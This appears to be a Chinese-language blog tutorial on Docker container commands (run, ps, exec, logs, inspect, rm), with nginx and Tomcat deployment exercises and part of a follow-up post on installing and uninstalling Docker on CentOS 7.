1、新建容器并运行命令&emsp;&emsp;docker run 创建一个新的容器并运行一个命令 &emsp;&emsp;语法：docker run [OPTIONS] IMAGE [COMMAND] [ARG...] &emsp;&emsp;OPTIONS说明： -d, –detach=false 指定容器运行于前台还是后台，默认为false，为true则后台运行 -i, –interactive=false 打开STDIN，用于控制台交互 -t, –tty=false 分配tty设备，该可以支持终端登录，默认为false -u, –user=”” 指定容器的用户 -a, –attach=[] 登录容器（必须是以docker run -d启动的容器） -w, –workdir=”” 指定容器的工作目录 -c, –cpu-shares=0 设置容器CPU权重，在CPU共享场景使用 -e, –env=[] 指定环境变量，容器中可以使用该环境变量 -m, –memory=”” 指定容器的内存上限 -P, –publish-all=false 随机指定容器暴露的端口 -p, –publish=[] 指定容器暴露的端口 -h, –hostname=”” 指定容器的主机名 -v, –volume=[] 给容器挂载存储卷，挂载到容器的某个目录 –volumes-from=[] 给容器挂载其他容器上的卷，挂载到容器的某个目录 –cap-add=[] 添加权限，权限清单详见：http://linux.die.net/man/7/capabilities –cap-drop=[] 删除权限，权限清单详见：http://linux.die.net/man/7/capabilities –cidfile=”” 运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法 –cpuset=”” 设置容器可以使用哪些CPU，此参数可以用来容器独占CPU –device=[] 添加主机设备给容器，相当于设备直通 –dns=[] 指定容器的dns服务器 –dns-search=[] 指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件 –entrypoint=”” 覆盖image的入口点 –env-file=[] 指定环境变量文件，文件格式为每行一个环境变量 –expose=[] 指定容器暴露的端口，即修改镜像的暴露端口 –link=[] 指定容器间的关联，使用其他容器的IP、env等信息 –lxc-conf=[] 指定容器的配置文件，只有在指定–exec-driver=lxc时使用 –name=”” 指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字 –net=”bridge” 容器网络设置: 使用docker daemon指定的网桥 –net=”host” 容器网络设置: 容器使用主机的网络 –net=”container” 容器网络设置: 使用其他容器的网路，共享IP和PORT等网络资源 –net=”none” 容器网络设置: 容器使用自己的网络（类似–net=bridge），但是不进行配置 –privileged=false 指定容器是否为特权容器，特权容器拥有所有的capabilities –restart=”no” 容器退出时不重启 –restart=”on-failure” 容器故障退出（返回值非零）时重启 –restart=”always” 容器退出时总是重启 –rm=false 指定容器停止后自动删除容器(不支持以docker run -d启动的容器) –sig-proxy=true 设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理 &emsp;&emsp;常用命令参数 -d 让容器后台运行 -it 保持标准输入打开（默认为false），让容器保持交互状态，不把阻塞/等待输入当成是任务结束 -p 主机端口:容器端口 #映射容器的端口号 -P 随机映射镜像所需要的端口号 -v 主机路径:容器路径 映射容器的存储卷 –rm 容器运行结束后自动销毁(连尸体都不会有) –name 设置容器名称 –hostname 设置容器的主机名 –restart=always 设置容器开机自动启动（systemctl start docker，systemctl enable docker搭配） #运行一个在后台执行的容器，同时，还能用控制台管理[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -i -t -d centos:lateste599b223e7e00bda6dd1af7d02248ea83c167e62e97d6a9ad821dc0b8e4c4a53[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe599b223e7e0 centos:latest &quot;/bin/bash&quot; 5 seconds ago Up 4 seconds lucid_banach#运行一个带命令在后台不断执行的容器，不直接展示容器内部信息[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe599b223e7e0 centos:latest &quot;/bin/bash&quot; 5 seconds ago Up 4 seconds lucid_banach[root@VM-0-15-centos ~]# docker run -d centos:latest ping www.docker.com626b539eeba4c0fe45770d7db8782bf4f20a9c207fbdc726663700ac150cdd4e[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES626b539eeba4 centos:latest &quot;ping www.docker.com&quot; 5 seconds ago Up 4 seconds nifty_solomone599b223e7e0 centos:latest &quot;/bin/bash&quot; 2 minutes ago Up 2 minutes lucid_banach#为容器指定一个名字。#容器暴露80端口，并指定宿主机2021端口与其通信(: 之前是宿主机端口，之后是容器需暴露的端口)#指定容器内目录与宿主机目录共享(: 之前是宿主机文件夹，之后是容器需共享的文件夹)，[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -it -d --name=centos_server -p 2021:80 -v /etc/www:/var/www centos:latest1e605144b3c4dc66112c7d8fba0b2dabada1d897523c56dc159705335dba5ae0[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1e605144b3c4 centos:latest &quot;/bin/bash&quot; 3 seconds ago Up 2 seconds 0.0.0.0:2021-&gt;80/tcp, :::2021-&gt;80/tcp centos_server#测试，启动并进入容器[root@VM-0-15-centos ~]# docker run -it centos /bin/bash[root@286621faf844 /]# ls #查看容器内的centos，基础版本，很多命令都不完善bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var 2、查看运行中的容器&emsp;&emsp;docker ps &emsp;&emsp;语法：docker ps [OPTIONS] -a #查看所有容器，包括未运行的 -l #查看最后一个运行的容器 -n #列出最近创建的n个容器 –no-trunc #不截断输出 -q #静默模式，只显示容器ID -s #显示总的文件大小 [root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES286621faf844 centos &quot;/bin/bash&quot; 6 minutes ago Exited (0) 4 minutes ago eloquent_chaplyginc3740c67c633 hello-world &quot;/hello&quot; 2 hours ago Exited (0) 2 hours ago agitated_lamarrdea8fbdd52bb 80x86/typecho &quot;/entrypoint.sh /app…&quot; 3 months ago Exited (137) 2 months ago infallible_blackwell1663d813cab4 80x86/typecho &quot;/entrypoint.sh /app…&quot; 3 months ago Exited (137) 3 months ago cranky_dirac#列出最近创建的2个容器信息[root@VM-0-15-centos ~]# docker ps -n 2CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES286621faf844 centos &quot;/bin/bash&quot; 6 minutes ago Exited (0) 4 minutes ago eloquent_chaplyginc3740c67c633 hello-world &quot;/hello&quot; 2 hours ago Exited (0) 2 hours ago agitated_lamarr 3、退出容器（1）容器里面&emsp;&emsp;当我们在容器里面的时候，退出容器的方式有多个 （2）容器外面&emsp;&emsp;docker stop 容器名/id &emsp;&emsp;docker start 容器名/id(已经停止的容器) 4、进入当前正在运行的容器&emsp;&emsp;docker attach 容器id #从前台进入容器（进入后exit退出了就会杀死容器） &emsp;&emsp;docker exec -it 容器id bash #从后门进入容器（进入后exit退出了只是退出了bash，并不会杀死容器） #我们通常容器都是使用后台方式运行的，需要进入容器，修改一些配置#命令docker exec -it 容器id bashshell#方法一[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 3 minutes ago Up 3 minutes charming_mendeleev[root@VM-0-15-centos ~]# docker exec -it 4519755902f9 bash[root@4519755902f9 /]# ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 12:49 pts/0 00:00:00 /bin/bashroot 15 0 0 12:54 pts/1 00:00:00 bashroot 29 15 0 12:54 pts/1 00:00:00 ps -ef[root@4519755902f9 /]# exitexit[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 6 minutes ago Up 6 minutes charming_mendeleev#方法二[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 6 minutes ago Up 6 minutes charming_mendeleev[root@VM-0-15-centos ~]# docker attach 4519755902f9[root@4519755902f9 /]# exitexit[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES#docker exec #进入容器后开启一个新的终端，可以在里面操作（常用）#docker attach #进入容器正在执行的终端，不会启动新的终端 5、启动和停止容器的操作docker start 容器id #启动容器docker restart 容器id #重启容器docker stop 容器id #停止当前正在运行的容器docker kill 容器id #强制停止当前容器 6、删除容器docker rm 容器id #删除指定的容器，不能删除正在运行的容器，如果要强制删除rm -fdocker rm -f $(docker ps -aq) #删除所有的容器docker ps -a -q|xargs docker rm #删除所有的容器。xargs 可以将管道或标准输入（stdin）数据转 换成命令行参数，也能够从文件的输出中读取数据。 四、常用其他命令1、后台启动容器[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -d centos629a55e2dcbd2c225fa93496c2c3afdda4fe3ecea978178f638cfc246c573021[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -it -d centos4519755902f94979002e9188463dc3684f34f52ee15ce7fc098a1819f618287b[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 3 seconds ago Up 2 seconds charming_mendeleev[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4519755902f9 centos &quot;/bin/bash&quot; 9 seconds ago Up 8 seconds charming_mendeleev629a55e2dcbd centos &quot;/bin/bash&quot; 25 seconds ago Exited (0) 24 seconds ago elastic_shockley#问题：docker ps发现centos停止了#常见的坑：docker容器使用后台运行，就必须要有一个前台进程，docker容器启动后，如果发现自己没有提供服务，就会立即停止 2、查看日志&emsp;&emsp;docker logs &emsp;&emsp;语法：docker logs [OPTIONS] CONTAINER -f # 跟踪日志输出 –since # 显示某个开始时间的所有日志 -t # 显示时间戳 –tail # 仅列出最新N条容器日志 #跟踪查看容器的日志输出[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -it -d centos ping www.docker.com436d7e51cf42977ed7683169d0277fa50719e3b74b379e691324c1f9b65b7d2e[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES436d7e51cf42 centos &quot;ping www.docker.com&quot; 6 seconds ago Up 5 seconds musing_hypatia[root@VM-0-15-centos ~]# docker logs -f -t --tail 10 436d7e51cf422021-08-29T13:03:43.358471450Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=25 ttl=231 time=130 ms2021-08-29T13:03:44.357885604Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=26 ttl=231 time=128 ms2021-08-29T13:03:45.360448310Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=27 ttl=231 time=129 ms2021-08-29T13:03:46.362365414Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=28 ttl=231 time=129 ms2021-08-29T13:03:49.362508740Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=31 ttl=231 time=129 ms2021-08-29T13:03:51.364265785Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=33 ttl=231 time=131 ms2021-08-29T13:03:54.365170137Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=36 ttl=231 time=131 ms2021-08-29T13:03:56.366807947Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=38 ttl=231 time=131 ms2021-08-29T13:03:57.366455842Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=39 ttl=231 time=131 ms2021-08-29T13:03:58.334405609Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=40 ttl=231 time=97.5 ms 3、查看容器中进程信息&emsp;&emsp;docker top 容器ID [root@VM-0-15-centos ~]# docker top 436d7e51cf42UID PID PPID C STIME TTY TIME CMDroot 5266 5248 0 21:03 pts/0 00:00:00 ping www.docker.com 4、查看镜像的元数据&emsp;&emsp;docker inspect 容器ID #测试[root@VM-0-15-centos ~]# docker inspect ec6e3fdec8c7[ &#123; &quot;Id&quot;: &quot;ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095&quot;, &quot;Created&quot;: &quot;2021-08-29T01:53:05.435416978Z&quot;, &quot;Path&quot;: &quot;/bin/bash&quot;, &quot;Args&quot;: [], &quot;State&quot;: &#123; &quot;Status&quot;: &quot;exited&quot;, &quot;Running&quot;: false, &quot;Paused&quot;: false, &quot;Restarting&quot;: false, &quot;OOMKilled&quot;: false, &quot;Dead&quot;: false, &quot;Pid&quot;: 0, &quot;ExitCode&quot;: 0, &quot;Error&quot;: &quot;&quot;, &quot;StartedAt&quot;: &quot;2021-08-29T01:53:05.774289777Z&quot;, &quot;FinishedAt&quot;: &quot;2021-08-29T01:53:05.773591821Z&quot; &#125;, &quot;Image&quot;: &quot;sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55&quot;, &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/resolv.conf&quot;, &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/hostname&quot;, &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/hosts&quot;, &quot;LogPath&quot;: &quot;/var/lib/docker/containers/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095/ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095-json.log&quot;, &quot;Name&quot;: &quot;/xenodochial_cartwright&quot;, &quot;RestartCount&quot;: 0, &quot;Driver&quot;: &quot;overlay2&quot;, &quot;Platform&quot;: &quot;linux&quot;, &quot;MountLabel&quot;: &quot;&quot;, &quot;ProcessLabel&quot;: &quot;&quot;, &quot;AppArmorProfile&quot;: &quot;&quot;, &quot;ExecIDs&quot;: null, &quot;HostConfig&quot;: &#123; &quot;Binds&quot;: null, &quot;ContainerIDFile&quot;: &quot;&quot;, &quot;LogConfig&quot;: &#123; &quot;Type&quot;: &quot;json-file&quot;, &quot;Config&quot;: &#123;&#125; &#125;, &quot;NetworkMode&quot;: &quot;default&quot;, &quot;PortBindings&quot;: &#123;&#125;, &quot;RestartPolicy&quot;: &#123; &quot;Name&quot;: &quot;no&quot;, &quot;MaximumRetryCount&quot;: 0 &#125;, &quot;AutoRemove&quot;: false, &quot;VolumeDriver&quot;: &quot;&quot;, &quot;VolumesFrom&quot;: null, &quot;CapAdd&quot;: null, &quot;CapDrop&quot;: null, &quot;CgroupnsMode&quot;: &quot;host&quot;, &quot;Dns&quot;: [], &quot;DnsOptions&quot;: [], &quot;DnsSearch&quot;: [], &quot;ExtraHosts&quot;: null, &quot;GroupAdd&quot;: null, &quot;IpcMode&quot;: &quot;private&quot;, &quot;Cgroup&quot;: &quot;&quot;, &quot;Links&quot;: null, &quot;OomScoreAdj&quot;: 0, &quot;PidMode&quot;: &quot;&quot;, &quot;Privileged&quot;: false, &quot;PublishAllPorts&quot;: false, &quot;ReadonlyRootfs&quot;: false, &quot;SecurityOpt&quot;: null, &quot;UTSMode&quot;: &quot;&quot;, &quot;UsernsMode&quot;: &quot;&quot;, &quot;ShmSize&quot;: 67108864, &quot;Runtime&quot;: &quot;runc&quot;, &quot;ConsoleSize&quot;: [ 0, 0 ], &quot;Isolation&quot;: &quot;&quot;, &quot;CpuShares&quot;: 0, &quot;Memory&quot;: 0, &quot;NanoCpus&quot;: 0, &quot;CgroupParent&quot;: &quot;&quot;, &quot;BlkioWeight&quot;: 0, &quot;BlkioWeightDevice&quot;: [], &quot;BlkioDeviceReadBps&quot;: null, &quot;BlkioDeviceWriteBps&quot;: null, &quot;BlkioDeviceReadIOps&quot;: null, &quot;BlkioDeviceWriteIOps&quot;: null, &quot;CpuPeriod&quot;: 0, &quot;CpuQuota&quot;: 0, &quot;CpuRealtimePeriod&quot;: 0, &quot;CpuRealtimeRuntime&quot;: 0, &quot;CpusetCpus&quot;: &quot;&quot;, &quot;CpusetMems&quot;: &quot;&quot;, &quot;Devices&quot;: [], &quot;DeviceCgroupRules&quot;: null, &quot;DeviceRequests&quot;: null, &quot;KernelMemory&quot;: 0, &quot;KernelMemoryTCP&quot;: 0, &quot;MemoryReservation&quot;: 0, &quot;MemorySwap&quot;: 0, &quot;MemorySwappiness&quot;: null, &quot;OomKillDisable&quot;: false, &quot;PidsLimit&quot;: null, &quot;Ulimits&quot;: null, &quot;CpuCount&quot;: 0, &quot;CpuPercent&quot;: 0, &quot;IOMaximumIOps&quot;: 0, &quot;IOMaximumBandwidth&quot;: 0, &quot;MaskedPaths&quot;: [ &quot;/proc/asound&quot;, &quot;/proc/acpi&quot;, &quot;/proc/kcore&quot;, &quot;/proc/keys&quot;, &quot;/proc/latency_stats&quot;, &quot;/proc/timer_list&quot;, &quot;/proc/timer_stats&quot;, &quot;/proc/sched_debug&quot;, &quot;/proc/scsi&quot;, &quot;/sys/firmware&quot; ], &quot;ReadonlyPaths&quot;: [ &quot;/proc/bus&quot;, &quot;/proc/fs&quot;, &quot;/proc/irq&quot;, &quot;/proc/sys&quot;, &quot;/proc/sysrq-trigger&quot; ] &#125;, &quot;GraphDriver&quot;: &#123; &quot;Data&quot;: &#123; &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da-init/diff:/var/lib/docker/overlay2/b298ad9ced6d87c18f01408e96b63e31dbc7ef41c7b5d6a749e54636a7730b15/diff&quot;, &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/merged&quot;, &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/diff&quot;, &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/9f58829d0c22ab90bee08aa58ddf072e689f795d72c4dfd3b5a95759a11357da/work&quot; &#125;, &quot;Name&quot;: &quot;overlay2&quot; &#125;, &quot;Mounts&quot;: [], &quot;Config&quot;: &#123; &quot;Hostname&quot;: &quot;ec6e3fdec8c7&quot;, &quot;Domainname&quot;: &quot;&quot;, &quot;User&quot;: &quot;&quot;, &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: false, &quot;AttachStderr&quot;: false, &quot;Tty&quot;: false, &quot;OpenStdin&quot;: false, &quot;StdinOnce&quot;: false, &quot;Env&quot;: [ &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot; ], &quot;Cmd&quot;: [ &quot;/bin/bash&quot; ], &quot;Image&quot;: &quot;centos&quot;, &quot;Volumes&quot;: null, &quot;WorkingDir&quot;: &quot;&quot;, &quot;Entrypoint&quot;: null, &quot;OnBuild&quot;: null, &quot;Labels&quot;: &#123; &quot;org.label-schema.build-date&quot;: &quot;20201204&quot;, &quot;org.label-schema.license&quot;: &quot;GPLv2&quot;, &quot;org.label-schema.name&quot;: &quot;CentOS Base Image&quot;, &quot;org.label-schema.schema-version&quot;: &quot;1.0&quot;, &quot;org.label-schema.vendor&quot;: &quot;CentOS&quot; &#125; &#125;, &quot;NetworkSettings&quot;: &#123; &quot;Bridge&quot;: &quot;&quot;, &quot;SandboxID&quot;: &quot;d3fedfdee8e6f0d6aa83a793c4e3e56ef29086f8e2cb6ecafc6c280c3d103b8f&quot;, &quot;HairpinMode&quot;: false, &quot;LinkLocalIPv6Address&quot;: &quot;&quot;, &quot;LinkLocalIPv6PrefixLen&quot;: 0, &quot;Ports&quot;: &#123;&#125;, &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/d3fedfdee8e6&quot;, &quot;SecondaryIPAddresses&quot;: null, &quot;SecondaryIPv6Addresses&quot;: null, &quot;EndpointID&quot;: &quot;&quot;, &quot;Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;IPAddress&quot;: &quot;&quot;, &quot;IPPrefixLen&quot;: 0, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;MacAddress&quot;: &quot;&quot;, &quot;Networks&quot;: &#123; &quot;bridge&quot;: &#123; &quot;IPAMConfig&quot;: null, &quot;Links&quot;: null, &quot;Aliases&quot;: null, &quot;NetworkID&quot;: &quot;115a2351052d4f81bc4d8f1c20f87f29da1d4bb50ae3543e2d8a1675b1630dc1&quot;, &quot;EndpointID&quot;: &quot;&quot;, &quot;Gateway&quot;: &quot;&quot;, &quot;IPAddress&quot;: &quot;&quot;, &quot;IPPrefixLen&quot;: 0, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;MacAddress&quot;: &quot;&quot;, &quot;DriverOpts&quot;: null &#125; &#125; &#125; &#125;] 5、从容器内拷贝文件到主机上&emsp;&emsp;docker cp 容器ID:容器内路径 主机路径 &emsp;&emsp;拷贝是一个手动过程，未来我们使用-v卷的技术，可以实现自动同步 五、小结 六、练习1、安装部署nginx[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker search nginxNAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 15385 [OK]jwilder/nginx-proxy Automated Nginx reverse proxy for docker con… 2061 [OK]richarvey/nginx-php-fpm Container running Nginx + PHP-FPM capable of… 816 [OK]jc21/nginx-proxy-manager Docker container for managing Nginx proxy ho… 237linuxserver/nginx An Nginx container, brought to you by LinuxS… 152tiangolo/nginx-rtmp Docker image with Nginx using the nginx-rtmp… 140 [OK]jlesage/nginx-proxy-manager Docker container for Nginx Proxy Manager 135 [OK]alfg/nginx-rtmp NGINX, nginx-rtmp-module and FFmpeg from sou… 105 [OK]jasonrivers/nginx-rtmp Docker images to host RTMP streams using NGI… 92 [OK]nginxdemos/hello NGINX webserver that serves a simple page co… 71 [OK]privatebin/nginx-fpm-alpine PrivateBin running on an Nginx, php-fpm &amp; Al… 56 [OK]nginx/nginx-ingress NGINX and NGINX Plus Ingress Controllers fo… 55nginxinc/nginx-unprivileged Unprivileged NGINX Dockerfiles 46staticfloat/nginx-certbot Opinionated setup for automatic TLS certs lo… 24 [OK]nginx/nginx-prometheus-exporter NGINX Prometheus Exporter for NGINX and NGIN… 19schmunk42/nginx-redirect A very simple container to redirect HTTP tra… 19 [OK]nginxproxy/nginx-proxy Automated Nginx reverse proxy for docker con… 18centos/nginx-112-centos7 Platform for running nginx 1.12 or building … 15centos/nginx-18-centos7 Platform for running nginx 1.8 or building n… 13raulr/nginx-wordpress Nginx front-end for the official wordpress:f… 13 [OK]flashspys/nginx-static Super Lightweight Nginx Image 10 [OK]mailu/nginx Mailu nginx frontend 9 [OK]sophos/nginx-vts-exporter Simple server that scrapes Nginx vts stats a… 7 [OK]ansibleplaybookbundle/nginx-apb An APB to deploy NGINX 2 [OK]wodby/nginx Generic nginx 1 [OK][root@VM-0-15-centos ~]# docker pull nginxUsing default tag: latestlatest: Pulling from library/nginxe1acddbe380c: Already existse21006f71c6f: Pull completef3341cc17e58: Pull complete2a53fa598ee2: Pull complete12455f71a9b5: Pull completeb86f2ba62d17: Pull completeDigest: sha256:4d4d96ac750af48c6a551d757c1cbfc071692309b491b70b2b8976e102dd3fefStatus: Downloaded newer image for nginx:latestdocker.io/library/nginx:latest[root@VM-0-15-centos ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest dd34e67e3371 13 days ago 133MBmysql latest 5a4e492065c7 13 days ago 514MBhello-world latest d1165f221234 5 months ago 13.3kBcentos latest 300e315adb2f 8 months ago 209MB80x86/typecho latest 3437f7346b4c 2 years ago 53.9MB[root@VM-0-15-centos ~]# docker run -d --name nginx01 -p 3344:80 nginxd0850b4943fcd70f14dd895826012a77bdb219b992060fc31fea07d8f5536803[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd0850b4943fc nginx &quot;/docker-entrypoint.…&quot; 5 seconds ago Up 4 seconds 0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp nginx01[root@VM-0-15-centos ~]# curl localhost:3344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 2、安装部署Tomcat#官方的使用docker run -it --rm tomcat:9.0#我们之前的启动都是后台，停止了容器之后，容器还是可以查到 而--rm一般用来测试，用完就删除容器#下载再运行[root@VM-0-15-centos ~]# docker pull tomcat[root@VM-0-15-centos ~]# docker run -d -p 3355:8080 --name tomcat01 tomcat64dc6975f6e47c040b7c476f7a4aa8af43fff314cfc3bcc539da5524b7b1d2c5#测试访问发现找不到#进入容器[root@VM-0-15-centos ~]# docker exec -it tomcat01 /bin/bashroot@64dc6975f6e4:/usr/local/tomcat# lsBUILDING.txt LICENSE README.md RUNNING.txt conf logs temp webapps.distCONTRIBUTING.md NOTICE RELEASE-NOTES bin lib native-jni-lib webapps workroot@64dc6975f6e4:/usr/local/tomcat# cd webappsroot@64dc6975f6e4:/usr/local/tomcat/webapps# lsroot@64dc6975f6e4:/usr/local/tomcat/webapps##发现问题：1、Linux命令少了 2、没有webapps#阿里云镜像的原因。默认是最小的镜像，所有不必要的都剔除掉#保证最小的可运行环境！ #ROOT在webapps.dist目录下root@64dc6975f6e4:/usr/local/tomcat# cd webapps.distroot@64dc6975f6e4:/usr/local/tomcat/webapps.dist# lsROOT docs examples host-manager managerroot@64dc6975f6e4:/usr/local/tomcat/webapps.dist# cd ..root@64dc6975f6e4:/usr/local/tomcat# cp -r webapps.dist/* webappsroot@64dc6975f6e4:/usr/local/tomcat##再次测试，成功","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"docker安装","slug":"docker安装","date":"2021-12-09T04:11:26.000Z","updated":"2022-01-03T03:25:48.404Z","comments":true,"path":"post/327177db.html","link":"","permalink":"https://wolke.cn/post/327177db.html","excerpt":"","text":"一、Docker的基本组成 1、镜像（image）： &emsp;&emsp;Docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，Tomcat镜像==&gt;run==&gt;Tomecat01容器（提供服务），通过这个镜像可以创建多个容器（最终服务或者项目运行就是在容器中的 2、容器（container）： &emsp;&emsp;通过镜像来创建的 &emsp;&emsp;Docker利用容器技术，独立运行一个或者一组应用 &emsp;&emsp;目前就可以把这个容器理解为就是一个简易的Linux系统 3、仓库（repository）： &emsp;&emsp;仓库就是存放镜像的地方 &emsp;&emsp;仓库分为公有仓库和私有仓库 二、安装Docker1、环境准备 需要Linux基础 CentOS7 使用XShell等连接远程服务器进行操作 2、环境查看&emsp;&emsp;uname -r #可以看到系统内核是3.0以上的（根据目前最新版本的Docker最好用3.0以上的） &emsp;&emsp;cat /etc/os-release #操作系统版本等信息，可以看到为CentOS7 3、安装&emsp;&emsp;查看帮助文档 （1）卸载旧的版本sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine （2）需要的安装包sudo yum install -y yum-utils （3）设置镜像的仓库sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo #默认是国外的#建议用国内的，这里用了阿里云的sudo yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo （4）更新yum软件包索引（文档并没有，但是推荐先这样做）sudo yum makecache fast （5）安装Docker相关依赖（docker-ce 社区版 ee 企业版）sudo yum install docker-ce docker-ce-cli containerd.io#可以使用docker version命令查看是否安装成功 （6）启动Dockersystemctl start docker （7）运行hello-worlddocker run hello-world （8）查看下载的hello-world镜像docker images 4、卸载Docker（了解）# 1、卸载依赖sudo yum remove docker-ce docker-ce-cli containerd.io# 2、删除资源sudo rm -rf /var/lib/docker # /var/lib/docker 为Docker的默认工作路径 三、回顾hello-world流程 四、底层原理1、Docker是怎么工作的&emsp;&emsp;Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。 